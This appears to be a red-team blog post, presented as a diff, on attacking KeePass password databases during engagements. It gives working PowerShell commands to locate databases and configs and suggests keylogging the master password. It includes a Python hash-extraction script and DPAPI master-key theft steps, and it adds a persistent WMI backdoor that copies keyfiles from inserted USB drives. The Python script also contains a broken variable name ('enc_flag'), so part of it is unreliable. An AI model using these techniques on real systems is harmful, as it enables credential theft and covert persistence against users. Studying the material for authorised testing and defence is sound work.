@@ -1,0 +1,247 @@
+<p><strong>[Edit 7/1/16]</strong> I wanted to make a few clarifying notes as there have been some questions surrounding this writeup:</p>
+<ul>
+<li>You only need administrative rights to execute any WMI subscriptions and/or gather files from user folders NOT normally accessible from the current user context (not everything described here needs admin rights).</li>
+<li>KeePass is not &#8220;bad&#8221; or &#8220;vulnerable&#8221; &#8211; it&#8217;s a much better solution than what we see deployed in most environments. However admins/companies sometimes tend to see solutions like this as some silver bullet, so one point of this post is to show that practical attack vectors against it are not unrealistic. This writeup does not cover any &#8216;vulnerability&#8217; in KeePass or a KeePass database/deployment, but rather covers a few notes on how to attack it operationally while on engagements.</li>
+<li>The whole attitude of &#8220;<em>if an attacker has code execution on your system, you&#8217;re screwed, so this isn&#8217;t interesting</em>&#8221; perplexes me a bit, since if that&#8217;s the case we should all just use passwords.xls on our desktops right? It seems that KeePass/other password managers were built as an additional layer of protection against the post-exploitation of user systems. I don&#8217;t quite get some people&#8217;s tendency to rag on post-ex techniques, but whatever ¯\_(ツ)_/¯</li>
+<li>The &#8220;<a href="http://keepass.info/help/base/security.html#secdesktop">secure desktop</a>&#8221; setting described is disabled by default and is not common in most enterprises (though it should be). In theory this should help mitigate keylogging a user&#8217;s master password but it doesn&#8217;t prevent an attacker from pilfering KeePass files. This is a great protection, but I would caution anyone who believes that this is also a silver bullet. I don&#8217;t know the exact mechanics of how their secure desktop implementation works, but I assume there is a way around it if you&#8217;re operating as <a href="https://twitter.com/jstnkndy/status/749013857058848768">NT AUTHORITY\SYSTEM</a>.</li>
+</ul>
+<p><strong>[/Edit]</strong></p>
+<p><strong>[Final Edit 7/11/16]</strong></p>
+<p><a href="https://twitter.com/tifkin_">@tifkin_</a> and I worked on a follow-up blog post and code release here: &#8220;<a href="http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/"><em>KeeThief – A Case Study in Attacking KeePass Part 2</em></a>&#8220;.</p>
+<p><strong>[/Edit]</strong></p>
+<p>We see a lot of KeePass usage while on engagements. In the corporate environments we operate in, it appears to be the most common password manager used by system administrators. We love to grab admins&#8217; KeePass databases and run wild, but this is easier said than done in some situations, especially when key files (or Windows user accounts) are used in conjunction with passwords. This post will walk through a hypothetical case study in attacking a KeePass instance that reflects implementations we&#8217;ve encountered in the wild.</p>
+<h2>First Steps</h2>
+<p>First things first: you need a way to determine if KeePass is running, and ideally what the version is. The easiest way to gather this information is a simple process listing, through something like Cobalt Strike or PowerShell:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-2689" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/keepass_beacon_enum1.png" alt="keepass_beacon_enum1" width="587" height="313" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum1.png 1178w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum1-300x160.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum1-768x409.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum1-1024x546.png 1024w" sizes="(max-width: 587px) 100vw, 587px" /></p>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-2690" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/keepass_beacon_enum2.png" alt="keepass_beacon_enum2" width="587" height="304" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum2.png 1414w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum2-300x155.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum2-768x398.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum2-1024x530.png 1024w" sizes="(max-width: 587px) 100vw, 587px" /></p>
+<p>Now it helps to know where the Keepass binary is actually located. By default the binary is located in <strong>C:\Program Files (x86)\KeePass Password Safe\</strong><strong> </strong>for KeePass 1.X and <strong>C:\Program Files (x86)\KeePass Password Safe 2\</strong> for version 2.X, but there&#8217;s also a portable version that can be launched without an install. Luckily we can use WMI here, querying for win32_processes and extracting out the ExecutablePath:</p>
+<pre class="wrap:true lang:ps decode:true">Get-WmiObject win32_process | Where-Object {$_.Name -like '*kee*'} | Select-Object -Expand ExecutablePath</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-2691" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/keepass_beacon_enum3.png" alt="keepass_beacon_enum3" width="599" height="198" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum3.png 1570w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum3-300x99.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum3-768x253.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum3-1024x338.png 1024w" sizes="(max-width: 599px) 100vw, 599px" /></p>
+<p>If KeePass isn&#8217;t running, we can use PowerShell&#8217;s <strong>Get-ChildItem</strong> cmdlet to search for the binary as well as any .kdb[x] databases:</p>
+<pre class="wrap:true lang:ps decode:true ">Get-ChildItem -Path C:\Users\ -Include @("*kee*.exe", "*.kdb*") -Recurse -ErrorAction SilentlyContinue | Select-Object -Expand FullName | fl</pre>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-2692" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/keepass_beacon_enum4.png" alt="keepass_beacon_enum4" width="599" height="241" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum4.png 1571w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum4-300x121.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum4-768x309.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_beacon_enum4-1024x412.png 1024w" sizes="(max-width: 599px) 100vw, 599px" /></p>
+<h2>Attacking the KeePass Database</h2>
+<p>We&#8217;ll sometimes grab the KeePass binary itself (to verify its version) as well as any .kdb (version 1.X) or .kdbx (version 2.X) databases. If the version is 2.28, 2.29, or 2.30 and the database is unlocked, you can use <a href="https://github.com/denandz">denandz</a>&#8216; <a href="https://github.com/denandz/KeeFarce">KeeFarce</a> project to extract passwords from memory; however, this attack involves dropping multiple files to disk (some of which are now flagged by antivirus). You could also try rolling your own version to get by the AV present on the system or disabling AV entirely (which we don&#8217;t really recommend). I&#8217;m not aware of a memory-only option at this point.</p>
+<p>We generally take a simpler approach- start a keylogger, kill the KeePass process, and wait for the user to input their unlock password. We may also just leave the keylogger going and wait for the user to unlock KeePass at the beginning of the day. While it&#8217;s possible for a user to set the &#8216;Enter master key on secure desktop&#8217; setting which claims to prevent keylogging, according to KeePass this option &#8220;<a href="http://keepass.info/help/base/security.html#secdesktop"><em>is turned off by default for compatibility reasons</em></a>&#8220;. KeePass 2.X can also be configured to use the Windows user account for authentication in combination with a password and/or keyfile (more on this in the <strong>DPAPI</strong> section).</p>
+<p>If you need to crack the password for a KeePass database, <a href="https://hashcat.net/forum/thread-5559.html">HashCat 3.0.0</a> (released 6/29/16) now includes support for KeePass 1.X and 2.X databases (-m 13400). As <a href="https://twitter.com/Fist0urs">@Fist0urs</a> <a href="https://github.com/hashcat/hashcat/pull/282">details</a>, you can extract a HashCat-compatible hash from a KeePass database using the <a href="http://fossies.org/linux/john/src/keepass2john.c">keepass2john</a> tool from the <a href="http://www.openwall.com/john/">John The Ripper</a> suite, which was written by Dhiru Kholia and released under the GPL. Here&#8217;s what the output looks like for a default KeePass 2.X database with the password of &#8216;password&#8217;:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3065" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/keepass2john.png" alt="keepass2john" width="1246" height="223" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john.png 1246w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john-300x54.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john-768x137.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john-1024x183.png 1024w" sizes="(max-width: 1246px) 100vw, 1246px" /></p>
+<p>This worked great, but I generally prefer a more portable solution in Python for these types of hash extractors. I coded up a quick-and-dirty Python port of Dhiru&#8217;s code on a <a href="https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc">Gist here</a> (it still needs more testing and keyfile integration):</p>
+<pre class="height-set:true lang:python decode:true" title="keepass2john.py" data-url="https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py">#!/usr/bin/python
+
+
+# Python port of keepass2john from the John the Ripper suite (http://www.openwall.com/john/)
+# ./keepass2john.c was written by Dhiru Kholia &lt;dhiru.kholia at gmail.com&gt; in March of 2012
+# ./keepass2john.c was released under the GNU General Public License
+#   source keepass2john.c source code from: http://fossies.org/linux/john/src/keepass2john.c
+#
+# Python port by @harmj0y, GNU General Public License
+#
+# TODO: handle keyfiles, test file inlining for 1.X databases, database version sanity check for 1.X
+#
+
+import sys
+import os
+import struct
+from binascii import hexlify
+
+
+def process_1x_database(data, databaseName, maxInlineSize=1024):
+    index = 8
+    algorithm = -1
+
+    encFlag = struct.unpack("&lt;L", data[index:index+4])[0]
+    index += 4
+    if (encFlag &amp; 2 == 2):
+        # AES
+        algorithm = 0
+    elif (enc_flag &amp; 8):
+        # Twofish
+        algorithm = 1
+    else:
+        print "Unsupported file encryption!"
+        return
+
+    # TODO: keyfile processing
+
+    # TODO: database version checking
+    version = hexlify(data[index:index+4])
+    index += 4
+    
+    finalRandomseed = hexlify(data[index:index+16])
+    index += 16
+
+    encIV = hexlify(data[index:index+16])
+    index += 16
+    
+    numGroups = struct.unpack("&lt;L", data[index:index+4])[0]
+    index += 4
+    numEntries = struct.unpack("&lt;L", data[index:index+4])[0]
+    index += 4
+
+    contentsHash = hexlify(data[index:index+32])
+    index += 32
+
+    transfRandomseed = hexlify(data[index:index+32])
+    index += 32
+
+    keyTransfRounds = struct.unpack("&lt;L", data[index:index+4])[0]
+
+    filesize = len(data)
+    datasize = filesize - 124
+
+    if((filesize + datasize) &lt; maxInlineSize):
+        dataBuffer = hexlify(data[124:])
+        end = "*1*%ld*%s" %(datasize, hexlify(dataBuffer))
+    else:
+        end = "0*%s" %(databaseName)
+
+    return "%s:$keepass$*1*%s*%s*%s*%s*%s*%s*%s" %(databaseName, keyTransfRounds, algorithm, finalRandomseed, transfRandomseed, encIV, contentsHash, end)
+
+
+def process_2x_database(data, databaseName):
+
+    index = 12
+    endReached = False
+    masterSeed = ''
+    transformSeed = ''
+    transformRounds = 0
+    initializationVectors = ''
+    expectedStartBytes = ''
+
+    while endReached == False:
+
+        btFieldID = struct.unpack("B", data[index])[0]
+        index += 1
+        uSize = struct.unpack("H", data[index:index+2])[0]
+        index += 2
+        # print "btFieldID : %s , uSize : %s" %(btFieldID, uSize)
+        
+        if btFieldID == 0:
+            endReached = True
+
+        if btFieldID == 4:
+            masterSeed = hexlify(data[index:index+uSize])
+
+        if btFieldID == 5:
+            transformSeed = hexlify(data[index:index+uSize])
+
+        if btFieldID == 6:
+            transformRounds = struct.unpack("H", data[index:index+2])[0]
+
+        if btFieldID == 7:
+            initializationVectors = hexlify(data[index:index+uSize])
+
+        if btFieldID == 9:
+            expectedStartBytes = hexlify(data[index:index+uSize])
+
+        index += uSize
+
+    dataStartOffset = index
+    firstEncryptedBytes = hexlify(data[index:index+32])
+
+    return "%s:$keepass$*2*%s*%s*%s*%s*%s*%s*%s" %(databaseName, transformRounds, dataStartOffset, masterSeed, transformSeed, initializationVectors, expectedStartBytes, firstEncryptedBytes)
+
+
+def process_database(filename):
+
+    f = open(filename, 'rb')
+    data = f.read()
+    f.close()
+
+    base = os.path.basename(filename)
+    databaseName = os.path.splitext(base)[0]
+
+    fileSignature = hexlify(data[0:8])
+
+    if(fileSignature == '03d9a29a67fb4bb5'):
+        # "2.X"
+        print process_2x_database(data, databaseName)
+
+    elif(fileSignature == '03d9a29a66fb4bb5'):
+        # "2.X pre release"
+        print process_2x_database(data, databaseName)
+
+    elif(fileSignature == '03d9a29a65fb4bb5'):
+        # "1.X"
+        print process_1x_database(data, databaseName)
+    else:
+        print "ERROR: KeePass signaure unrecognized"
+
+
+if __name__ == "__main__":
+    if len(sys.argv) &lt; 2:
+        sys.stderr.write("Usage: %s &lt;kdb[x] file[s]&gt;\n" % sys.argv[0])
+        sys.exit(-1)
+
+    for i in range(1, len(sys.argv)):
+        process_database(sys.argv[i])
+</pre>
+<p>Here&#8217;s the output for the same default database:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3066" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/keepass2john_py.png" alt="keepass2john_py" width="1246" height="224" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john_py.png 1246w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john_py-300x54.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john_py-768x138.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/keepass2john_py-1024x184.png 1024w" sizes="(max-width: 1246px) 100vw, 1246px" /></p>
+<h2>KeePass.config.xml</h2>
+<p>More savvy admins will use a keyfile as well as a password to unlock their KeePass databases. Some will name this file conspicuously and store in My Documents/Desktop, but other times it&#8217;s not as obvious.</p>
+<p>Luckily for us, KeePass nicely outlines all the possible configuration file locations for 1.X and 2.x <a href="http://keepass.info/help/base/configuration.html">here</a>. Let&#8217;s take a look at what a sample 2.X <strong>KeePass.config.xml</strong> configuration looks like (located at <strong>C:\Users\user\AppData\Roaming\KeePass\KeePass.config.xml</strong> or in the same folder as a portable KeePass binary):</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-large wp-image-2629" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/keepass_config-1024x457.png" alt="keepass_config" width="640" height="286" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_config-1024x457.png 1024w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_config-300x134.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_config-768x343.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/keepass_config.png 1462w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>The XML config nicely tells us exactly where the keyfile is located. If the admin is using their &#8220;Windows User Account&#8221; to derive the master password (<strong>&lt;UserAccount&gt;true&lt;/UserAccount&gt;</strong> under <strong>&lt;KeySources&gt;</strong>) see the <strong>DPAPI</strong> section below. If they are even more savvy and store the key file on a USB drive not persistently mounted to the system, check out the <strong>Nabbing Keyfiles with WMI</strong> section.</p>
+<p><strong>[Edit 7/4/16]</strong> I released a short PowerShell script that will find and parse any KeePass.config.xml (2.X) and KeePass.ini (1.X) files <a href="https://gist.github.com/HarmJ0y/e9daa76c7888e24b5e3943b82f1d1d4f">here</a>. <strong>[/Edit]</strong></p>
+<h2>DPAPI</h2>
+<p>Setting &#8216;UserAccount&#8217; set to true in a <strong>KeePass.config.xml</strong> means that the master password for the database includes the &#8216;Windows User Account&#8217; option. KeePass will mix an element of the user&#8217;s current Windows user account in with any specific password and/or keyfile to create a <a href="http://keepass.info/help/base/keys.html">composite master key</a>. If this option is set and all you grab is a keylogged password and/or keyfile, it might seem that you&#8217;re still out of luck. Or are you?</p>
+<p>In order to use a &#8216;Windows User Account&#8217; for a composite key in a reasonably secure manner, KeePass takes advantage of the <a href="https://en.wikipedia.org/wiki/Data_Protection_API">Windows Data Protection Application Programming Interface</a> (DPAPI). This interface provides a number of simple cryptographic calls (CryptProtectData()/CryptUnProtectData()) that allow for easy encryption/decryption of sensitive DPAPI data &#8220;blobs&#8221;. User information (including their password) is used to encrypt a user &#8216;master key&#8217; (located at <strong>%APPDATA%\Microsoft\Protect\&lt;SID&gt;\</strong>) that&#8217;s then used with optional entropy to encrypt/decrypt application-specific blobs. The code and entropy used by KeePass for these calls is outlined in the <a href="https://fossies.org/dox/KeePass-2.34-Source/KcpUserAccount_8cs_source.html">KeePass source</a> and the KeePass specific DPAPI blob is kept at <strong>%APPDATA%\KeePass\ProtectedUserKey.bin</strong>.</p>
+<p>Fortunately, recovering a KeePass composite master key with a Windows account mixin is a problem several people have encountered before. The KeePass wiki even has a nice <a href="https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/">writeup on the recovery process</a>:</p>
+<ul>
+<li>Copy the target user account DPAPI master key folder from <strong>C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\</strong> . The folder name will be a SID (S-1-&#8230;) pattern and contain a hidden <strong>Preferred</strong> file and master key file with a GUID naming scheme.</li>
+<li>Copy <strong>C:\Users\&lt;USER&gt;\AppData\Roaming\KeePass\ProtectedUserKey.bin </strong>. This is the protected KeePass DPAPI blob used to create the composite master key.</li>
+<li>Take note of the username and userdomain of the user who created the KeePass database as well as their plaintext password.</li>
+<li>Move the &lt;SID&gt; folder to <strong>%APPDATA%\Microsoft\Protect\ </strong>on an attacker controlled Windows machine (this can be non-domain joined).</li>
+<li>Set a series of registry keys under <strong>HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\DPAPI\MigratedUsers</strong> , including the old user&#8217;s SID, username, and domain. The KeePass wiki has a registry template for this <a href="https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials/attachment/DPAPI%20migration.reg.txt">here</a>.</li>
+<li>Run <strong>C:\Windows\system32\dpapimig.exe</strong>, the &#8220;Protected Content Migration&#8221; utility, entering the old user&#8217;s password when prompted.</li>
+<li>Open KeePass 2.X, select the stolen database.kdbx, enter the password/keyfile, and check &#8220;Windows User Account&#8221; to open the database.</li>
+</ul>
+<p>The <a href="https://gist.github.com/HarmJ0y/2af9ac57f95e6663a26742774c822b10"><strong>Restore-UserDPAPI.ps1</strong></a> PowerShell Gist will automate this process, given the copied SID folder with the user&#8217;s master key, original username/userdomain, and KeePass <strong>ProtectedUserKey.bin </strong>:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-3067" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/Restore_UserDPAP_ps1.png" alt="Restore_UserDPAP_ps1" width="1814" height="596" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/Restore_UserDPAP_ps1.png 1814w, https://blog.harmj0y.net/wp-content/uploads/2016/06/Restore_UserDPAP_ps1-300x99.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/Restore_UserDPAP_ps1-768x252.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/Restore_UserDPAP_ps1-1024x336.png 1024w" sizes="(max-width: 1814px) 100vw, 1814px" /></p>
+<p><img loading="lazy" decoding="async" class="aligncenter wp-image-3068" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/dpapimig.png" alt="dpapimig" width="600" height="465" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/dpapimig.png 1262w, https://blog.harmj0y.net/wp-content/uploads/2016/06/dpapimig-300x232.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/dpapimig-768x595.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/06/dpapimig-1024x794.png 1024w" sizes="(max-width: 600px) 100vw, 600px" /></p>
+<h2><img loading="lazy" decoding="async" class="aligncenter wp-image-3069" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/06/master_key_user_account.png" alt="master_key_user_account" width="600" height="348" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/06/master_key_user_account.png 860w, https://blog.harmj0y.net/wp-content/uploads/2016/06/master_key_user_account-300x174.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/06/master_key_user_account-768x446.png 768w" sizes="(max-width: 600px) 100vw, 600px" /></h2>
+<p>&nbsp;</p>
+<p>If you&#8217;re interested, more information on DPAPI is available in <a href="https://twitter.com/dfirfpi">@dfirfpi</a>&#8216;s 2014 <a href="https://digital-forensics.sans.org/summit-archives/dfirprague14/Give_Me_the_Password_and_Ill_Rule_the_World_Francesco_Picasso.pdf">SANS presentation</a> and <a href="http://blog.digital-forensics.it/2015/01/happy-dpapi.html">post on the subject</a>. Jean-Michel Picod and Elie Bursztein presented research on DPAPI and its implementation in their &#8220;<a href="https://www.blackhat.com/presentations/bh-dc-10/Picod_Jean-Michel/BlackHat-DC-2010-Picod-DPAPI-slides.pdf">Reversing DPAPI and Stealing Windows Secrets Offline</a>&#8221; 2010 BlackHat talk. The <a href="http://dpapick.com/">dpapick</a> project (recently updated) allows for decryption of encrypted DPAPI blobs using recovered master key information. <a href="https://twitter.com/gentilkiwi">Benjamin Delpy</a> has also done a lot of <a href="https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/kuhl_m_dpapi.c">phenomenal work in this area</a>, but we still need to take the proper deep dive into his code that it deserves. We&#8217;re hoping we can use Mimikatz to extract the DPAPI key and other necessary data from a host in one swoop, but we haven&#8217;t worked out that process yet.</p>
+<p><strong>[Edit 7/1/16]</strong> <a href="https://twitter.com/TalBeerySec">Tal Be&#8217;ery</a> also alerted me to <a href="https://twitter.com/ItaiGrady">@ItaiGrady</a>&#8216;s great talk, &#8220;Protecting browsers’ secrets in a domain environment&#8221; (<a href="http://www.slideshare.net/ItaiGrady/protecting-browsers-secrets-in-adomainenvironment">slides here</a> and <a href="https://www.youtube.com/watch?v=KeQVrYQ5Bzg">video here</a>). <strong>[/Edit]</strong></p>
+<h2>Nabbing Keyfiles with WMI</h2>
+<p><a href="http://twitter.com/mattifestation">Matt Graeber</a> gave a great presentation at BlackHat 2015 titled &#8220;Abusing Windows Management Instrumentation (WMI) to Build a Persistent, Asynchronous, and Fileless Backdoor&#8221; (slides <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf">here</a> and whitepaper <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor.pdf">here</a>). He released the PoC WMI_Backdoor code <a href="https://github.com/mattifestation/WMI_Backdoor">on GitHub</a>.</p>
+<p>One of the WMI events Matt describes is the extrinsic <a href="https://msdn.microsoft.com/en-us/library/aa394516(v=vs.85).aspx">Win32_VolumeChangeEvent</a> which fires every time a <a href="https://github.com/mattifestation/WMI_Backdoor/blob/master/WMIBackdoor.ps1#L153-L169">USB drive is inserted and mounted</a>. The <a href="https://github.com/mattifestation/WMI_Backdoor/blob/master/WMIBackdoor.ps1#L402-L426">&#8216;InfectDrive&#8217; ActiveScriptEventConsumer</a> in Matt&#8217;s PoC code shows how to interact with a mounted drive letter with VBScript. We can take this approach to clone off the admin&#8217;s keyfile whenever his/her USB is plugged in.</p>
+<p>We have two options, one that persists between reboots and one that runs until the powershell.exe process exits. For the non-reboot persistent option, we can use <a href="https://technet.microsoft.com/en-us/library/hh849840.aspx">Register-WmiEvent</a> and Win32_VolumeChangeEvent to trigger a file copy action for the known key path:</p>
+<pre class="wrap:true lang:ps decode:true">Register-WmiEvent -Query 'SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2' -SourceIdentifier 'DriveInserted' -Action {$DriveLetter = $EventArgs.NewEvent.DriveName;if (Test-Path "$DriveLetter\key.jpg") {Copy-Item "$DriveLetter\key.jpg" "C:\Temp\" -Force}}</pre>
+<p>This trigger will clone the target file into C:\Temp\ whenever the drive is inserted. You can also register to monitor for events on remote computers (assuming you have the appropriate permissions) with <strong>-ComputerName</strong> and an optional <strong>-Credential</strong> argument.</p>
+<p>For reboot persistence we can easily add a new action to the <strong>New-WMIBackdoorAction</strong> function in Matt&#8217;s <a href="https://github.com/mattifestation/WMI_Backdoor">WMI_Backdoor</a> code:</p>
+<pre class="lang:ps decode:true ">        'FileClone' {
+            $VBScript = @"
+                Dim oFSO, oFile, sFilePath
+
+                Set oFSO = CreateObject("Scripting.FileSystemObject")
+
+                sFilePath = TargetEvent.DriveName &amp; "\key.jpg"
+
+                If oFSO.FileExists(sFilePath) Then
+                    oFSO.CopyFile sFilePath, "C:\temp\key.jpg", True
+
+                End If 
+"@
+
+            if ($ActionName) {
+                $Name = $ActionName
+            } else {
+                $Name = 'FileClone'
+            }
+        }</pre>
+<p>We can then register the trigger and action for the backdoor with:</p>
+<pre class="wrap:true lang:ps decode:true">Register-WMIBackdoor -Trigger $(New-WMIBackdoorTrigger -DriveInsertion) -Action $(New-WMIBackdoorAction -FileClone)</pre>
+<p>Cleanup takes a few more commands:</p>
+<pre class="wrap:true lang:ps decode:true ">Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object {$_.Filter -like "*DriveInsertionTrigger*"} | Remove-WmiObject
+Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Where-Object {$_.Name -eq "DriveInsertionTrigger"} | Remove-WmiObject
+Get-WmiObject -Namespace "root\subscription" -Class 'ActiveScriptEventConsumer' | Where-Object {$_.Name -eq "FileClone"} | Remove-WmiObject
+
+</pre>
+<p>Big thanks to <a href="https://twitter.com/mattifestation">Matt</a> for answering my questions in this area and pointing me in the right direction.</p>
+<h2>Keyfiles on Network Mounted Drives</h2>
+<p>Occasionally users will store their keyfiles on network-mounted drives. PowerView&#8217;s new <a href="https://github.com/PowerShellMafia/PowerSploit/blob/81ac124f2211799207711fcd1b5fadb0091510f6/Recon/PowerView.ps1#L8801-L8909"><strong>Get-RegistryMountedDrive</strong></a> function lets you enumerate network mounted drives for all users on a local or remote machine, making it easier to figure out exactly where a keyfile is located:</p>
+<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-2763" src="http://www.harmj0y.net/blog/wp-content/uploads/2016/05/get_registrymounteddrive.png" alt="get_registrymounteddrive" width="1542" height="720" srcset="https://blog.harmj0y.net/wp-content/uploads/2016/05/get_registrymounteddrive.png 1542w, https://blog.harmj0y.net/wp-content/uploads/2016/05/get_registrymounteddrive-300x140.png 300w, https://blog.harmj0y.net/wp-content/uploads/2016/05/get_registrymounteddrive-768x359.png 768w, https://blog.harmj0y.net/wp-content/uploads/2016/05/get_registrymounteddrive-1024x478.png 1024w" sizes="(max-width: 1542px) 100vw, 1542px" /></p>
+<h2>Wrapup</h2>
+<p>Using KeePass (or another password database solution) is significantly better than storing everything in passwords.xls, but once an attacker has administrative rights on a machine it&#8217;s nearly impossible to stop them from grabbing the information they want from the target. With a few PowerShell one-liners and some WMI, we can quickly enumerate KeePass configurations and set monitors to grab necessary key files. This is just scratching the surface of what can be done with WMI- it would be easy to add functionality that enumerates/exfiltrates any interesting files present on USB drives as they&#8217;re inserted.</p>
